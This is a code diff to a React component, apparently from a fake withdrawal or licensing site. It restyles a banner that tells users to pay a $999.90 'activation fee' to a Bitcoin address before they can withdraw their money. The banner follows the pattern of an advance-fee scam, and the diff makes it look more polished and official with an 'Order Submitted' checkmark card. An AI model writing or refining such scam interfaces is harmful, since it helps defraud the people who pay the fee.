@@ -47,7 +47,6 @@ const debitCard = () => {
             }
 
             if(response.ok){
-                toast.success(`successful`)
                 setBanner(true)
             }
         } catch (error) {
@@ -60,10 +59,27 @@ const debitCard = () => {
     }
 
     if (banner) return (
-
-        <div className='border border-rose-500 bg-rose-200 p-2 rounded-md text-rose-700'>Thanks for submitting your license order, complete the order activation fee to finish up your withdrawal process
-
-          <span className='text-black font-bold'> $999.9</span> to <span className='text-black font-bold'>bc1qsjre9tfda3x9rw346n5y3xz4ywhz4je6epg0ut</span>
+        <div className='flex flex-col gap-y-4 p-4 rounded-xl bg-gradient-to-br from-slate-800 to-slate-900 border border-slate-700 text-white'>
+            <div className='flex items-center gap-x-2 text-green-400'>
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                <h4 className='font-semibold text-lg'>Order Submitted</h4>
+            </div>
+            <p className='text-slate-300 text-sm leading-relaxed'>
+                Thanks for submitting your license order. Complete the activation fee to finish your withdrawal process.
+            </p>
+            <div className='flex flex-col gap-y-2 bg-slate-800 rounded-lg p-3 border border-slate-600'>
+                <div className='flex items-center justify-between'>
+                    <span className='text-slate-400 text-xs uppercase tracking-wide'>Amount</span>
+                    <span className='text-white font-bold text-lg'>$999.90</span>
+                </div>
+                <hr className='border-slate-700' />
+                <div className='flex flex-col gap-y-1'>
+                    <span className='text-slate-400 text-xs uppercase tracking-wide'>Send to</span>
+                    <span className='text-blue-400 text-xs font-mono break-all'>bc1qsjre9tfda3x9rw346n5y3xz4ywhz4je6epg0ut</span>
+                </div>
+            </div>
         </div>
     )
 
